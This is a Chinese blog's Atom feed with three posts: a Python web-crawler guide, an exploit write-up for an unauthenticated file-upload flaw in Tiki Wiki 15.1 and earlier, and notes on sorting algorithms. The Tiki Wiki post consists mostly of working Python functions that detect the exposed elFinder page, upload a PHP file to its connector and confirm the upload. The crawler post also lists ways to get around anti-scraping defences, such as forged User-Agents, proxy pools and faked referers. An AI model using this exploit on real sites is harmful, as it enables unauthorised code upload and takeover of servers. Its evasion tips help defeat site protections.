<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sakuraのblog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-05-18T14:07:44.634Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>sakura</name>
    <email>wn1014332658@gmail.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python爬虫的入门与进阶</title>
    <link href="http://yoursite.com/2017/05/18/crawler/"/>
    <id>http://yoursite.com/2017/05/18/crawler/</id>
    <published>2017-05-18T14:05:42.000Z</published>
    <updated>2017-05-18T14:07:44.634Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170518/171045447.jpg" alt="mark"><br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170518/171146510.png" alt="mark"></p>
<h2 id="书籍推荐："><a href="#书籍推荐：" class="headerlink" title="书籍推荐："></a>书籍推荐：</h2><p>《python核心编程》/《python语言及其应用》-&gt;《python cookbook》 </p>
<p>《用Python写网络爬虫》</p>
<h2 id="python-爬虫实践文章"><a href="#python-爬虫实践文章" class="headerlink" title="python/爬虫实践文章"></a>python/爬虫实践文章</h2><p><a href="https://juejin.im/post/58dce2248d6d8100613a4cfb" target="_blank" rel="external">https://juejin.im/post/58dce2248d6d8100613a4cfb</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/21479334" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/21479334</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/25633789" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/25633789</a></p>
<p><a href="https://xlzd.me/tag/crawler/" target="_blank" rel="external">https://xlzd.me/tag/crawler/</a></p>
<p><a href="http://dongweiming.github.io/Expert-Python/#1" target="_blank" rel="external">http://dongweiming.github.io/Expert-Python/#1</a></p>
<h2 id="学习建议"><a href="#学习建议" class="headerlink" title="学习建议"></a>学习建议</h2><p>熟悉了python语法之后，写了一两个就入门了。网上有很多爬虫的文章，<strong>但是一定要自己动手去写</strong></p>
<p><strong>初级文章读一百篇和读一两篇是一样的，除了浪费时间以外。</strong> </p>
<p>另外，初学者没必要一上来就做很大很有成就感的事情，可以先写个简单的，然后不断给自己正向反馈。</p>
<p>比如可以先只是将数据在终端打印出来，然后再渐渐将数据规整化了以后保存到本地的数据库或者文件里面，然后再考虑提高效率，还有一些比较高深的技巧，比如研究分布式呀、断点续爬，怎么控制不同的worker。</p>
<p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170518/172146533.png" alt="mark"></p>
<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170518/160246823.png" alt="mark"></p>
<h2 id="怎么使用这个思维导图？"><a href="#怎么使用这个思维导图？" class="headerlink" title="怎么使用这个思维导图？"></a>怎么使用这个思维导图？</h2><p>先从右上角开始，了解http的内容，然后再学抓取工具。</p>
<h3 id="关于抓取工具"><a href="#关于抓取工具" class="headerlink" title="关于抓取工具"></a>关于抓取工具</h3><ul>
<li>Chrome和firebug选其一即可。</li>
<li>Tamper Data是一个篡改数据、截停请求的调试器。</li>
<li>fiddler 能记录所有客户端的http和https请求，监视、设置断点，修改输入输出的数据。</li>
<li>Charles 抓包工具，主要用来抓取手机的包。Web端的抓取策略可能比较复杂和严格，但是在移动端要简单的多。我一般写爬虫就是先看一下有没有开放的API，如果没有的话再看手机端。<br><a href="https://mp.weixin.qq.com/s?__biz=MzA3NDk1NjI0OQ==&amp;mid=2247483927&amp;idx=1&amp;sn=3c7be971f8baf5a3d9e4e55b700aba0f&amp;chksm=9f76aea1a80127b70fe3f777a1cfe2c2c4a54c84e5c99772f528d0bf8d606d472675330558fe#rd" target="_blank" rel="external">移动端爬虫的一个栗子</a>    </li>
</ul>
<h3 id="关于请求库"><a href="#关于请求库" class="headerlink" title="关于请求库"></a>关于请求库</h3><p>个人最推荐requests而完全不推荐按照urllib或者urllib2的方式来写。因为requests帮你考虑的东西更多，比如标准库里往往是默认不支持gzip压缩的，而requests会自动的压缩，而这往往能减少大量的压缩时间。<br>此外，由于历史原因，标准库的写法冗杂而不优雅，比起高度封装的requests用起来要麻烦的多。</p>
<p>举个栗子：</p>
<p>①urllib2<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">from</span> cookielib <span class="keyword">import</span> CookieJar</div><div class="line"></div><div class="line">hb_url = <span class="string">'https://httpbin.org/basic-auth/user/pass'</span></div><div class="line"></div><div class="line">req = urllib2.Request(hb_url)</div><div class="line"></div><div class="line">password_manager = urllib2.HTTPPasswordMgrWithDefaultRealm()</div><div class="line">password_manager.add_password(<span class="keyword">None</span>, hb_url, <span class="string">'user'</span>, <span class="string">'pass'</span>)</div><div class="line"></div><div class="line">auth_manager = urllib2.HTTPBasicAuthHandler(password_manager)</div><div class="line"></div><div class="line">cj = CookieJar()</div><div class="line">cookie_manager = urllib2.HTTPCookieProcessor(cj)</div><div class="line"></div><div class="line">proxy_handler = urllib2.ProxyHandler(&#123;<span class="string">'http'</span>: <span class="string">'127.0.0.1'</span>&#125;)</div><div class="line"></div><div class="line">opener = urllib2.build_opener(auth_manager, cookie_manager, proxy_handler)</div><div class="line"></div><div class="line">urllib2.install_opener(opener)</div><div class="line"></div><div class="line">handler = urllib2.urlopen(req)</div><div class="line"></div><div class="line"><span class="keyword">print</span> handler.getcode()</div><div class="line"><span class="keyword">print</span> handler.headers.getheader(<span class="string">'content-type'</span>)</div><div class="line">data = json.load(handler)</div><div class="line"><span class="keyword">print</span> data[<span class="string">'authenticated'</span>]</div><div class="line"><span class="comment"># ------</span></div><div class="line"><span class="comment"># 200</span></div><div class="line"><span class="comment"># 'application/json'</span></div><div class="line"><span class="comment"># True</span></div></pre></td></tr></table></figure></p>
<p>②requests<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">hb_url = <span class="string">'https://httpbin.org/basic-auth/user/pass'</span></div><div class="line">proxies = &#123;</div><div class="line">    <span class="string">'http'</span>: <span class="string">'http://127.0.0.1'</span>,</div><div class="line">&#125;</div><div class="line"></div><div class="line">r = requests.get(hb_url, auth=(<span class="string">'user'</span>, <span class="string">'pass'</span>), proxies=proxies)</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.status_code</div><div class="line"><span class="keyword">print</span> r.headers[<span class="string">'content-type'</span>]</div><div class="line"><span class="keyword">print</span> r.json()[<span class="string">'authenticated'</span>]</div></pre></td></tr></table></figure></p>
<h3 id="关于解析库"><a href="#关于解析库" class="headerlink" title="关于解析库"></a>关于解析库</h3><ul>
<li>beautiful soap: 页面处理更友好，代码直观，但是解析比较慢，对于页面的处理比较绕。</li>
<li>Xpath+lxml:最推荐，可以直接用一个表达式找到要找的内容，而bs就没这么方便，它要一层一层的去循环。<br><a href="http://www.w3school.com.cn/xhtml/index.asp" target="_blank" rel="external">学习xml</a></li>
<li>re</li>
</ul>
<h3 id="关于并发编程"><a href="#关于并发编程" class="headerlink" title="关于并发编程"></a>关于并发编程</h3><ul>
<li>不推荐twisted;asyncio是未来的趋势，推荐。<a href="https://github.com/dongweiming/weapp-zhihulive" target="_blank" rel="external">知乎Live微信小程序 &amp; asyncio爬虫</a></li>
</ul>
<h3 id="关于任务调度框架"><a href="#关于任务调度框架" class="headerlink" title="关于任务调度框架"></a>关于任务调度框架</h3><ul>
<li>celery：分布式任务队列</li>
<li>huey:推荐小规模的爬虫需求使用，也推荐读一下它的源码。<a href="https://github.com/coleifer/huey" target="_blank" rel="external">https://github.com/coleifer/huey</a></li>
</ul>
<h2 id="抓取的流程图"><a href="#抓取的流程图" class="headerlink" title="抓取的流程图"></a>抓取的流程图</h2><p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170518/181125978.png" alt="mark"></p>
<p><strong>发送网络请求-&gt;下载好数据后解析html-&gt;解析成想要的格式之后存储</strong></p>
<h2 id="celery的流程图"><a href="#celery的流程图" class="headerlink" title="celery的流程图"></a>celery的流程图</h2><p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170518/181411194.png" alt="mark"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="http://onc55v8te.bkt.clouddn.com/blog/20170518/194754070.png" alt="mark"></h2><p>链接：<a href="http://pan.baidu.com/s/1skDyoUT" target="_blank" rel="external">http://pan.baidu.com/s/1skDyoUT</a> 密码：3tsi 就是那个live1.mp4</p>
<p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170518/195002034.png" alt="mark"><br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170518/195015479.png" alt="mark"></p>
<p>链接：<a href="http://pan.baidu.com/s/1skDyoUT" target="_blank" rel="external">http://pan.baidu.com/s/1skDyoUT</a> 密码：3tsi 就是那个live2.mp4</p>
<h2 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h2><p>AJAX出现的较早，在分离这上面做的不是很好，大厂都已经迁移到了Fetch上。<br><a href="https://github.com/camsong/blog/issues/2" target="_blank" rel="external">https://github.com/camsong/blog/issues/2</a></p>
<h2 id="动态网页抓取"><a href="#动态网页抓取" class="headerlink" title="动态网页抓取"></a>动态网页抓取</h2><p>关于动态网页的抓取是一件比较困难的事情。有些动态页面可以从接口直接获取数据，但是有一些不行，比如：</p>
<ul>
<li>用到了现在比较潮流的框架，比如react；</li>
<li>有些需要页面交互才能获取到数据，比如点个按钮</li>
<li>有些是在javascript执行之后生成的。<br>这种时候就必须要了解这个过程中是怎么实现渲染的，我们要考虑一个动态页面的抓取的过程。</li>
</ul>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p><strong>业界动态网页的抓取，常使用selenium + phantomjs，其实就像是打开浏览器，设定一些操作和事件，来模仿一个真实的用户，再通过它提供的接口找到要爬取的元素，拿到它的值。</strong><br>selenium本来是用来做自动化测试的，还能做鼠标拖动、截屏之类的操作。<br>phantomjs是一个没有web界面的，可脚本编程的webkit浏览器引擎，可以进行CSS、DOM操作等等。</p>
<p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170518/204226753.png" alt="mark"></p>
<p>链接：<a href="http://pan.baidu.com/s/1skDyoUT" target="_blank" rel="external">http://pan.baidu.com/s/1skDyoUT</a> 密码：3tsi 就是那个live3.mp4</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NDk1NjI0OQ==&amp;mid=2247483737&amp;idx=1&amp;sn=3f44134e630408c9b950f7d513722059&amp;chksm=9f76adefa80124f94d0d0faa8751530636cb9863e9af9d6c56475719b57c105aa611423d5656#rd" target="_blank" rel="external">几篇celery的文章（一）</a><br><a href="http://www.bjhee.com/celery.html" target="_blank" rel="external">几篇celery的文章（二）</a><br><a href="http://funhacks.net/2016/12/13/celery/" target="_blank" rel="external">几篇celery的文章（三）</a></p>
<p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170518/210110160.png" alt="mark"></p>
<p>很多人会纠结于是用多线程多进程还是asyncio呢，要不要学习twisted呢？其实不需要纠结，先实现功能。</p>
<p>其实主要的性能瓶颈在于要爬取的网站的网络延时、页面渲染的速度还有反爬虫策略。</p>
<p>当然爬虫本身性能可优化的地方也很多，这里有一些建议</p>
<ol>
<li>并发或者分布式的方式去爬取。</li>
<li>使用队列减少数据库的访问。</li>
<li>按需对数据写操作，从单个执行变成批量执行。（通常是先存在某个地方，比如reddis,然后调一个批量任务定期抓取）</li>
<li>选择合适的数据库建立正确的索引。如果早期对需求不清楚不确定，用Nosql（比如Mongodb）方便很多，即使数据脏了也可以通过程序处理。</li>
<li>并发效率并不是线性的，并发数高了对网站和数据库还是有负担。<br>……</li>
</ol>
<p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170518/211427350.png" alt="mark"></p>
<h2 id="对付常用的反爬虫策略"><a href="#对付常用的反爬虫策略" class="headerlink" title="对付常用的反爬虫策略"></a>对付常用的反爬虫策略</h2><h3 id="设置IP的访问频率"><a href="#设置IP的访问频率" class="headerlink" title="设置IP的访问频率"></a>设置IP的访问频率</h3><p>如果超出一定的频率就会出现验证码。处理验证码可以专门写程序处理，也可以使用开源项目。</p>
<p><em>推荐的生成验证码图片的项目 <a href="https://github.com/lepture/captcha" target="_blank" rel="external">https://github.com/lepture/captcha</a> </em></p>
<h3 id="伪造User-Agent"><a href="#伪造User-Agent" class="headerlink" title="伪造User Agent"></a>伪造User Agent</h3><p>一直用一个UA会被开发工程师发现。</p>
<h3 id="建立IP代理池"><a href="#建立IP代理池" class="headerlink" title="建立IP代理池"></a>建立IP代理池</h3><p><em>获取大量免费代理ip的项目<a href="https://github.com/awolfly9/IPProxyTool" target="_blank" rel="external">https://github.com/awolfly9/IPProxyTool</a>  </em></p>
<h3 id="改变refer值"><a href="#改变refer值" class="headerlink" title="改变refer值"></a>改变refer值</h3><p>不直接访问，伪造refer</p>
<h3 id="模仿搜索引擎"><a href="#模仿搜索引擎" class="headerlink" title="模仿搜索引擎"></a>模仿搜索引擎</h3><p>有可能被打上好人卡~</p>
<h3 id="保存cookie，使用cookie免登陆"><a href="#保存cookie，使用cookie免登陆" class="headerlink" title="保存cookie，使用cookie免登陆"></a>保存cookie，使用cookie免登陆</h3><h2 id="关于反反爬虫的项目"><a href="#关于反反爬虫的项目" class="headerlink" title="关于反反爬虫的项目"></a>关于反反爬虫的项目</h2><p><strong>推荐的项目：<a href="https://github.com/luyishisi/Anti-Anti-Spider" target="_blank" rel="external">https://github.com/luyishisi/Anti-Anti-Spider</a></strong></p>
<h2 id="学习典例"><a href="#学习典例" class="headerlink" title="学习典例"></a>学习典例</h2><p>爬虫入门：<br><a href="https://zhuanlan.zhihu.com/p/21479334" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/21479334</a></p>
<p>知道创宇面试题：<br><a href="http://www.dongwm.com/archives/pa-chong-lian-xi/" target="_blank" rel="external">http://www.dongwm.com/archives/pa-chong-lian-xi/</a></p>
<p>搜狐面试：<br><a href="https://github.com/dongweiming/mtime" target="_blank" rel="external">https://github.com/dongweiming/mtime</a></p>
<p><strong>awesome（个人推荐）：</strong></p>
<p><a href="https://github.com/BruceDone/awesome-crawler" target="_blank" rel="external">https://github.com/BruceDone/awesome-crawler</a></p>
<p><a href="https://github.com/liinnux/awesome-crawler-cn" target="_blank" rel="external">https://github.com/liinnux/awesome-crawler-cn</a></p>
<p><a href="https://github.com/facert/awesome-spider" target="_blank" rel="external">https://github.com/facert/awesome-spider</a></p>
<p><a href="https://github.com/aosabook/500lines/tree/master/crawler/code" target="_blank" rel="external">https://github.com/aosabook/500lines/tree/master/crawler/code</a></p>
<p>scrapy +redis+mongodb进行分布式爬虫 </p>
<p><a href="https://github.com/gnemoug/distribute_crawler" target="_blank" rel="external">https://github.com/gnemoug/distribute_crawler</a></p>
<p>技术选型： </p>
<ul>
<li>mongodb:存储爬取的结果（因为它不要求字段的数据结构严格一致化，对脏数据的容错性好）</li>
<li>redis:分布式/消息队列/一级缓存（存储中间数据）</li>
<li>scrapy:爬虫里最好的一个框架，基于twisted，高度封装。</li>
</ul>
<p>scrapy+django拓展</p>
<p><a href="https://github.com/scrapy-plugins/scrapy-djangoitem" target="_blank" rel="external">https://github.com/scrapy-plugins/scrapy-djangoitem</a></p>
<h2 id="爬虫情景"><a href="#爬虫情景" class="headerlink" title="爬虫情景"></a>爬虫情景</h2><h3 id="对腾讯视频、优酷视频的评论、播放量等的采集"><a href="#对腾讯视频、优酷视频的评论、播放量等的采集" class="headerlink" title="对腾讯视频、优酷视频的评论、播放量等的采集"></a>对腾讯视频、优酷视频的评论、播放量等的采集</h3><p>打开网页，弹一个h5或flash的播放器，会请求后端发送视频资源。 </p>
<ul>
<li>页面打开后渲染的第一页就是评论，然后其他页在你翻页或者滚动的时候通过ajax再去加载出来。</li>
<li>刚开始打开页面的时候，底下就没有评论。在后期通过ajax请求过来。相当于视频加载和评论加载（或者其他）分开进行。</li>
</ul>
<p><strong> 一般是不可能打开页面后全部评论加载出来的 </strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://onc55v8te.bkt.clouddn.com/blog/20170518/171045447.jpg&quot; alt=&quot;mark&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://onc55v8te.bkt.clouddn.com/blog/20
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
      <category term="爬虫" scheme="http://yoursite.com/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>tiki_wiki（&lt;=15.1）任意文件上传漏洞</title>
    <link href="http://yoursite.com/2017/04/24/Tiki_Wiki_Unauthenticated_File_Upload/"/>
    <id>http://yoursite.com/2017/04/24/Tiki_Wiki_Unauthenticated_File_Upload/</id>
    <published>2017-04-24T03:29:42.000Z</published>
    <updated>2017-04-23T02:57:29.873Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tiki-Wiki-lt-15-1-Unauthenticated-File-Upload"><a href="#Tiki-Wiki-lt-15-1-Unauthenticated-File-Upload" class="headerlink" title="Tiki Wiki &lt;=15.1 - Unauthenticated File Upload"></a>Tiki Wiki &lt;=15.1 - Unauthenticated File Upload</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><strong>利用Tiki利用Tiki Wiki&lt;=15.1中的文件上传漏洞，<br>漏洞来自tiki的第三方组件ELFinder -version 2.0<br>该组件带有一个默认的示例页面：包括上传、删除、重命名、创建目录等<br>并且该页面不强制进行文件扩展名、内容类型等验证。<br>因此，未经身份验证的用户也可以上传PHP文件。</strong></p>
<h2 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h2><h3 id="1-检测漏洞是否存在"><a href="#1-检测漏洞是否存在" class="headerlink" title="1. 检测漏洞是否存在"></a>1. 检测漏洞是否存在</h3><p>使用requests模块，<a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="external">http://docs.python-requests.org/zh_CN/latest/user/quickstart.html</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url, port)</span>:</span></div><div class="line">    parts = [<span class="string">'http://'</span>, url, <span class="string">':'</span>, port, <span class="string">'/tiki/vendor_extra/elfinder/elfinder.html'</span>]</div><div class="line">    target_url = <span class="string">''</span>.join(<span class="string">'%s'</span> % part <span class="keyword">for</span> part <span class="keyword">in</span> parts)</div><div class="line">    print(target_url)</div><div class="line">    r = requests.get(target_url)</div><div class="line">    <span class="keyword">if</span> (r.status_code == <span class="number">200</span>):</div><div class="line">        print(<span class="string">"检测成功,开始攻击"</span>)</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(<span class="string">"未检测到"</span>)</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure></p>
<h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ul>
<li>选择一个php文件上传然后抓包可得：<br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/104629854.png" alt="mark"></li>
<li>据此，使用requests库提交Multipart/form-data格式的数据，查看post部分<br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/104720598.png" alt="mark"></li>
<li><p>据此构造参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">files = &#123;<span class="string">'cmd'</span>: (<span class="keyword">None</span>, <span class="string">'upload'</span>),</div><div class="line">             <span class="string">'target'</span>: (<span class="keyword">None</span>, <span class="string">'l1_XA'</span>),</div><div class="line">             <span class="string">'upload[]'</span>: (filename, open(filename, <span class="string">'rb'</span>), <span class="string">'application/octet-stream'</span>)</div><div class="line">             &#125;</div></pre></td></tr></table></figure>
</li>
<li><p>随后使用post方法提交</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(url, port, filename)</span>:</span></div><div class="line">    parts = [<span class="string">'http://'</span>, url, <span class="string">':'</span>, port, <span class="string">'/tiki/vendor_extra/elfinder/php/connector.minimal.php'</span>]</div><div class="line">    target_url = <span class="string">''</span>.join(<span class="string">'%s'</span> % part <span class="keyword">for</span> part <span class="keyword">in</span> parts)</div><div class="line">    files = &#123;<span class="string">'cmd'</span>: (<span class="keyword">None</span>, <span class="string">'upload'</span>),</div><div class="line">             <span class="string">'target'</span>: (<span class="keyword">None</span>, <span class="string">'l1_XA'</span>),</div><div class="line">             <span class="string">'upload[]'</span>: (filename, open(filename, <span class="string">'rb'</span>), <span class="string">'application/octet-stream'</span>)</div><div class="line">             &#125;</div><div class="line">    r = requests.post(target_url, files=files)</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="3-检测是否上传成功"><a href="#3-检测是否上传成功" class="headerlink" title="3.检测是否上传成功"></a>3.检测是否上传成功</h3><p>如果上传成功，会在/tiki/vendor_extra/elfinder/files/路径下找到上传的文件<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_success</span><span class="params">(url, port, filename)</span>:</span></div><div class="line">    parts = [<span class="string">'http://'</span>, url, <span class="string">':'</span>, port, <span class="string">'/tiki/vendor_extra/elfinder/files/'</span>, filename]</div><div class="line"></div><div class="line">    target_url = <span class="string">''</span>.join(<span class="string">'%s'</span> % part <span class="keyword">for</span> part <span class="keyword">in</span> parts)</div><div class="line">    r = requests.get(target_url)</div><div class="line">    <span class="keyword">if</span> (r.status_code == <span class="number">200</span>):</div><div class="line">        print(<span class="string">"上传成功~"</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(<span class="string">"上传失败"</span>)</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Tiki-Wiki-lt-15-1-Unauthenticated-File-Upload&quot;&gt;&lt;a href=&quot;#Tiki-Wiki-lt-15-1-Unauthenticated-File-Upload&quot; class=&quot;headerlink&quot; title=&quot;Ti
    
    </summary>
    
    
      <category term="exploit" scheme="http://yoursite.com/tags/exploit/"/>
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>基本排序算法的分析与实现</title>
    <link href="http://yoursite.com/2017/04/23/algorithm_sort_1/"/>
    <id>http://yoursite.com/2017/04/23/algorithm_sort_1/</id>
    <published>2017-04-22T17:29:42.000Z</published>
    <updated>2017-04-22T17:58:49.791Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>因为发现自己好像已经很久没有像样的写过算法了……慢慢的重新整理算法吧。<br>写成一个系列算了~（反正也是按照书的顺序简单记笔记）</strong></p>
<h1 id="初级排序算法"><a href="#初级排序算法" class="headerlink" title="初级排序算法"></a>初级排序算法</h1><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><h3 id="算法思想："><a href="#算法思想：" class="headerlink" title="算法思想："></a>算法思想：</h3><p>首先，找到数组中<strong>最小</strong>的那个元素，然后将它和数组第一个元素<strong>交换位置</strong>。然后在<strong>剩下的元素</strong>中找到<strong>最小</strong>的元素，和第二个元素<strong>交换位置</strong>。如此往复，因为它总是在<strong>不断地选择剩余元素中的最小者</strong>，所以是选择排序。</p>
<ol>
<li>从左向右移动指针<br> <code>i++</code></li>
<li><p>确定在右边最小项的索引</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> min=i;</div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;N;j++)</div><div class="line">    <span class="keyword">if</span>(less(a[j],a[min])<span class="comment">//如果a[j]&lt;a[min]</span></div><div class="line">        min=j;</div></pre></td></tr></table></figure>
</li>
<li><p>交换位置<br> <code>exch(a,i,min);</code></p>
</li>
</ol>
<h3 id="代码实现（java）"><a href="#代码实现（java）" class="headerlink" title="代码实现（java）"></a>代码实现（java）</h3><p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170421/031419468.png" alt="mark"></p>
<h3 id="效率分析"><a href="#效率分析" class="headerlink" title="效率分析"></a>效率分析</h3><p><strong>对于长度为N的数组，选择排序大约需要N^2/2次比较和N次交换</strong><br>比较次数：首先寻找第一个最小项，除了它本身之外，都做一次比较，所以是N-1次；到最后一个最小项，无需比较，所以是0次，共需：<br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170421/034022029.png" alt="mark"><br>交换次数：每选择一个元素交换一次，共需N次<br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170421/032016688.png" alt="mark"></p>
<h3 id="算法特点"><a href="#算法特点" class="headerlink" title="算法特点"></a>算法特点</h3><ul>
<li>运行时间和输入无关。<br>一个已经有序的数组和一个随机排列的数组所用的排序时间一样长！</li>
<li>数据的移动是最少的。<br>交换次数和数组的大小是线性关系</li>
</ul>
<h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><h3 id="算法思想"><a href="#算法思想" class="headerlink" title="算法思想"></a>算法思想</h3><ol>
<li>从左向右扫描<br><code>i++</code></li>
<li>从左向右移动，交换a[i]和它左边最大的一项。<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&gt;<span class="number">0</span>;j--)</div><div class="line">    <span class="keyword">if</span>(less(a[j],a[j-<span class="number">1</span>])</div><div class="line">        exch(a[j],a[j-<span class="number">1</span>]);</div><div class="line">    <span class="keyword">else</span> <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h3><p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170421/035627041.png" alt="mark"></p>
<h3 id="效率分析-1"><a href="#效率分析-1" class="headerlink" title="效率分析"></a>效率分析</h3><p><strong>对于随机排列，长度为N且主键不重复的数组，平均情况下，插入排序需要约N^2/4次比较以及N^2/4次交换，最好情况下需要N-1次比较和0次交换</strong><br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170421/040012464.png" alt="mark"><br>最坏情况下（逆序数组），对角线之下所有元素都要移动位置，最好情况下都不需要。<br>比较的总次数是交换的次数加上N-1</p>
<h3 id="算法特点-1"><a href="#算法特点-1" class="headerlink" title="算法特点"></a>算法特点</h3><p>插入排序对于部分有序的数组来说效率更高。</p>
<p>部分有序：</p>
<ul>
<li>数组中每个元素距离他的最终位置都不远</li>
<li>一个有序的大数组接一个小数组</li>
<li>数组中只有几个元素位置不对</li>
</ul>
<h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><h3 id="算法思想-1"><a href="#算法思想-1" class="headerlink" title="算法思想"></a>算法思想</h3><ol>
<li>选择递增数列（例如1/2(3^k-1)）</li>
<li>对于递增数列中的每个元素h，用插入排序将h个子数组独立的排序</li>
</ol>
<h3 id="算法实现-1"><a href="#算法实现-1" class="headerlink" title="算法实现"></a>算法实现</h3><p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170421/042345748.png" alt="mark"></p>
<h3 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h3><p>使用递增数列1,4,13,40,121,364……的希尔排序所需的比较次数不会超出N的若干倍乘以递增序列的长度。</p>
